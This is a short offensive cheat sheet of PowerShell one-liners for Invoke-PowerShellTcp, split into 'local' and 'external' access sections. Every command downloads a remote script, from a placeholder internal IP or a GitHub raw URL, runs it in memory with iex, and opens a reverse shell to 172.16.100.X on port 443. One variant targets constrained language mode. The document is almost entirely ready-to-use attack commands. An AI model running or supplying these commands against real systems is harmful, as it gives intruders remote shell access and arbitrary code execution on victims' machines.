# Invoke-PowerShellTcp
#By Luis Carreto

#Local Accres
powershell.exe -c iex ((New-Object  Net.WebClient).DownloadString('http://172.16.100.X/Invoke-PowerShellTcp.ps1'));Power -Reverse -IPAddress 172.16.100.X -Port 443 

powershell.exe iex (iwr http://172.16.100.X/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.X -Port 443    //powershell constrained language


#External Acces
powershell.exe -c iex ((New-Object  Net.WebClient).DownloadString('https://raw.githubusercontent.com/dr0pc/Invoke-PowerShellTcp/main/Invoke-PowerShellTcp.ps1'));Power -Reverse -IPAddress 172.16.100.X -Port 443 


